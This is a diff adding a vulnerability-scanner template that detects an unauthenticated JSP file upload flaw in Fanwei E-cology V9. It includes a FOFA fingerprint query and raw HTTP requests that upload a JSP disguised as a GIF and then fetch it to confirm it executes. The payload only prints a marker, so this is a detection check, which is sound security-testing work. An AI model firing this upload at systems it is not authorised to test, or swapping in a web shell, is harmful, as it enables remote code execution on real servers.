@@ -1,0 +1,52 @@
+id: fanwei-e-cology-v9-uploadoperation-file-upload
+
+info:
+  name: Fanwei E-cology V9 File Upload
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,fileupload
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wev8" || body="ecology" || body="e-cology" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - raw:
+      - |
+        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------316085978974248253177894516
+
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="file"; filename="zp857857.jsp"
+        Content-Type: image/jpeg
+
+        GIF89a
+        <% out.println("zp857");%>
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="filePath"
+
+        1111
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="submit"
+
+        Submit
+        -----------------------------316085978974248253177894516
+
+      - |
+        GET /page/exportImport/fileTransfer/zp857857.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "zp857"
+
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionId"
